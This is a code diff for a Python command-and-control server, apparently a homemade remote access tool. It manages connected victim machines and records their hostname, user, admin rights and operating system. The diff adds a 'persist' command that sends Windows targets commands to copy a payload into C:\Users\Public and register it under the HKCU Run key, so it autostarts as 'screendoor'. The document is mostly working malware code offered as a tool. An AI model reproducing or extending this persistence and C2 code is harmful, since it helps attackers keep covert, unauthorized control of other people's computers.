@@ -43,7 +43,7 @@ def comm_out(targ_id, message):
     message = str(message)
     targ_id.send(message.encode())
 
-def target_comm(targ_id):
+def target_comm(targ_id, targets, num):
     while True:
         message = input('Send Message > ')
         comm_out(targ_id, message)
@@ -53,6 +53,14 @@ def target_comm(targ_id):
             break
         if message == 'background' or message == 'bg':
             break
+        if message == 'persist':
+            payload_name = input('Enter the name of the payload to add to autorun: ')
+            if targets[num][6] == 1:
+                persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\Public'
+                targ_id.send(persist_command_1.encode())
+                persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
+                targ_id.send(persist_command_2.encode())
+                print('[!] Run this command to clean up the registry: \n reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v screendoor /f')
         else:
             response = comm_in(targ_id)
             if response == 'exit':
@@ -79,6 +87,10 @@ def comm_handler():
             username = remote_target.recv(1024).decode()
             admin = remote_target.recv(1024).decode()
             opsys = remote_target.recv(1024).decode()
+            if 'Windows' in opsys:
+                pay_val = 1
+            else:
+                pay_val = 2
             if admin == 1:
                 admin_val = 'Yes'
             elif username == 'root':
@@ -90,10 +102,10 @@ def comm_handler():
             time_record = (f"{date.month}/{date.day}/{date.year} {cur_time}")
             host_name = socket.gethostbyaddr(remote_ip[0])
             if host_name is not None:
-                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val, opsys])
+                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val, opsys, pay_val])
                 print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Command > ', end="")
             else:
-                targets.append([remote_target, remote_ip[0], time_record, username, admin_val, opsys])
+                targets.append([remote_target, remote_ip[0], time_record, username, admin_val, opsys, pay_val])
                 print(f'\n[+] Connection received from {remote_ip[0]}\n' + 'Command > ', end="")
         except:
             pass
@@ -222,7 +234,7 @@ if __name__ == '__main__':
                 if command.split(" ")[1] == '-i':
                     num = int(command.split(" ")[2])
                     targ_id = (targets[num])[0]
-                    target_comm(targ_id)
+                    target_comm(targ_id, targets, num)
         except KeyboardInterrupt:
             print('\n[!] Keyboard interrupt issued.')
             kill_flag = 1
